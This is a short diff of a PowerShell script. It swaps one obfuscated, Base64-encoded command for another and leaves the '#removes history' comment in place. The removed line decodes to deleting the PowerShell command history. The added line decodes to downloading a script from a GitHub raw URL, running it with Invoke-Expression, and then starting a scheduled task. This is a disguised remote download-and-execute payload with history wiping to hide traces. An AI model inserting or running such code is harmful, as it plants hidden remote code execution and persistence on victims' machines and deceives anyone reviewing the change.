@@ -1337,7 +1337,7 @@ if (CHECK_AND_PATCH -eq $true) {
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
     #removes history
-    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
+    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aWV4IChpd3IgLXVyaSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzQzYTE3MjMvdGVzdC9tYWluL3N0YXJ0dXAucHMxIiAtdXNlYikKU3RhcnQtU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJHRhc2tfbmFtZQ==")))
     if ($debug) {
         Read-Host -Prompt "Press Enter to continue"
     }
